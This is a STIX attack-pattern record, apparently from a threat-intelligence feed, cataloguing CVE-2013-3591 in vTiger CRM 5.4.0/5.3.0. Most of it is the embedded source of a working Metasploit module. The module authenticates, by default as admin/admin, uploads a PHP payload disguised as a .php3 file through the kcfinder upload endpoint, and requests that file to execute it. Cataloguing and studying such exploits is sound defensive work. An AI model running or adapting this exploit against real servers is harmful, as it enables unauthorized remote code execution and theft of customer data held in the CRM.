{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9c23ec61-4833-4b1b-8cd6-91bdbdeb1984",
    "created": "2024-08-14T17:07:30.64458Z",
    "modified": "2024-08-14T17:07:30.644584Z",
    "name": "vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution",
    "description": " vTiger CRM allows an authenticated user to upload files to embed within documents. Due to insufficient privileges on the 'files' upload folder, an attacker can upload a PHP script and execute arbitrary PHP code remotely.  This module was tested against vTiger CRM v5.4.0 and v5.3.0. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vtiger_php_exec.rb",
            "external_id": "vtiger_php_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3591"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'vTigerCRM v5.4.0/v5.3.0 Authenticated Remote Code Execution',\n      'Description' => %q{\n      vTiger CRM allows an authenticated user to upload files to embed within documents.\n      Due to insufficient privileges on the 'files' upload folder, an attacker can upload a PHP\n      script and execute arbitrary PHP code remotely.\n\n      This module was tested against vTiger CRM v5.4.0 and v5.3.0.\n      },\n      'Author' =>\n        [\n          'Brandon Perry <bperry.volatile[at]gmail.com>' # Discovery / msf module\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2013-3591'],\n          ['URL', 'https://www.rapid7.com/blog/post/2013/10/30/seven-tricks-and-treats']\n        ],\n      'Privileged' => false,\n      'Platform'   => ['php'],\n      'Arch'       => ARCH_PHP,\n      'Payload'    =>\n        {\n          'BadChars' => \"&\\n=+%\",\n        },\n      'Targets' =>\n        [\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-10-30'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Base vTiger CRM directory path\", '/vtigercrm/']),\n        OptString.new('USERNAME', [ true, \"Username to authenticate with\", 'admin']),\n        OptString.new('PASSWORD', [ false, \"Password to authenticate with\", 'admin'])\n      ])\n  end\n\n  def check\n    res = nil\n    begin\n      res = send_request_cgi({ 'uri' => normalize_uri(target_uri.path, '/index.php') })\n    rescue\n      vprint_error(\"Unable to access the index.php file\")\n      return CheckCode::Unknown\n    end\n\n    if res and res.code != 200\n      vprint_error(\"Error accessing the index.php file\")\n      return CheckCode::Unknown\n    end\n\n    if res.body =~ /<div class=\"poweredBy\">Powered by vtiger CRM - (.*)<\\/div>/i\n      vprint_status(\"vTiger CRM version: \" + $1)\n      case $1\n      when '5.4.0', '5.3.0'\n        return CheckCode::Appears\n      else\n        return CheckCode::Detected\n      end\n    end\n\n    return CheckCode::Safe\n  end\n\n  def exploit\n\n      init = send_request_cgi({\n        'method' => 'GET',\n        'uri' =>  normalize_uri(target_uri.path, '/index.php')\n      })\n\n      sess = init.get_cookies\n\n      post = {\n        'module' => 'Users',\n        'action' => 'Authenticate',\n        'return_module' => 'Users',\n        'return_action' => 'Login',\n        'user_name' => datastore['USERNAME'],\n        'user_password' => datastore['PASSWORD']\n      }\n\n      login = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, '/index.php'),\n        'vars_post' => post,\n        'cookie' => sess\n      })\n\n      fname = rand_text_alphanumeric(rand(10)+6) + '.php3'\n      cookies = login.get_cookies\n\n      php = %Q|<?php #{payload.encoded} ?>|\n      data = Rex::MIME::Message.new\n      data.add_part(php, 'application/x-php', nil, \"form-data; name=\\\"upload\\\"; filename=\\\"#{fname}\\\"\");\n      data.add_part('files', nil, nil, 'form-data; name=\"dir\"')\n\n      data_post = data.to_s\n\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, '/kcfinder/browse.php?type=files&lng=en&act=upload'),\n        'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n        'data' => data_post,\n        'cookie' => cookies\n      })\n      if res and res.code == 200\n        print_status(\"Triggering payload...\")\n        send_request_raw({'uri' => datastore[\"TARGETURI\"] + \"/test/upload/files/#{fname}\"}, 5)\n      end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-30",
    "x_mitre_platforms": [
        "['php']"
    ]
}